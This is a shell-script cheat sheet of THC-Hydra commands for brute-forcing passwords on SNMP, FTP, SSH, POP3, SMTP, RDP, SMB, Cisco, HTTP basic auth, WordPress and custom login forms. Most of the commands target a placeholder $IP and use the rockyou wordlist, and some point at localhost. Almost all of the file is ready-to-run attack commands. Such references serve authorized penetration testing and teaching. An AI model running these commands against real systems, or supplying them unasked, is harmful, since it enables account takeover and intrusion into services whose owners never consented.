#!/bin/sh
## ------------------------------------------------------ ##
##    [+] Xe1phix-[THC-Hydra]-Cheatsheet-[v4.8.53].sh
## ------------------------------------------------------ ##


##-=================================-##
##   [+] Hydra - Bruteforce SNMP
##-=================================-##
hydra -P $PassFile.txt -v $IP snmp


##-===========================================-##
##   [+] Hydra - Bruteforce FTP known user
##-===========================================-##
hydra -t 1 -l $User -P /usr/share/wordlists/rockyou.txt -vV $IP ftp


##-====================================================-##
##   [+] Hydra SSH using list of users and passwords
##-====================================================-##
hydra -v -V -u -L $Users.txt -P $PassFile.txt -t 1 -u $IP ssh


##-=============================================================-##
##   [+] Hydra SSH using a known password and a username list
##-=============================================================-##
hydra -v -V -u -L $Users.txt -p "<known password>" -t 1 -u $IP ssh


##-====================================================-##
##   [+] Hydra SSH Against Known username on port 22
##-====================================================-##
hydra $IP -s 22 ssh -l $User -P $PassFile.txt


##-=================================-##
##   [+] Hydra - POP3 Brute Force
##-=================================-##
hydra -l $User -P $PassFile -f $IP pop3 -V


##-================================-##
##   [+] Hydra - SMTP Brute Force
##-================================-##
hydra -P $PassFile $IP smtp -V


##-=============================================================-##
##   [+] Hydra - attack http get 401 login with a dictionary
##-=============================================================-##
hydra -L ./webapp.txt -P $PassFile $IP http-get /admin


##-==========================================================-##
##   [+] Hydra attack Windows Remote Desktop with rockyou
##-==========================================================-##
hydra -t 1 -V -f -l $User -P /usr/share/wordlists/rockyou.txt rdp://$IP


##-=================================================-##
##   [+] Hydra brute force SMB user with rockyou:
##-=================================================-##
hydra -t 1 -V -f -l $User -P /usr/share/wordlists/rockyou.txt $IP smb


##-==================================================-##
##   [+] Hydra brute force a Wordpress admin login
##-==================================================-##
hydra -l $User -P $File.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'







hydra -t 2 -P $PassFile cisco
hydra -t 2 -m $Pass -P $Wordlist.txt cisco-enable


hydra -l $User -P $PassFile.txt -o $File.txt -t 1 -f 127.0.0.1 http-get-form "enviar.php:user=^USER^&pass=^PASS^:Algo esta errado"

hydra -l $User -P $PassFile.txt -o $File.txt -t 1 -f -w 15 127.0.0.1 http-post-form "/login/logar.php:user=^USER^&pass=^PASS^:S=Logado com sucesso"

hydra -l $User -P $PassFile.txt -o $File.txt -t 1 -f 127.0.0.1 http-post-form "/login/logar.php:user=^USER^&pass=^PASS^:Usuario ou senha invalida"

hydra -L users.txt -P $PassFile.txt -o $File.txt localhost http-head /colt/

hydra -l $User -P $PassFile.txt -w 15 localhost ftp



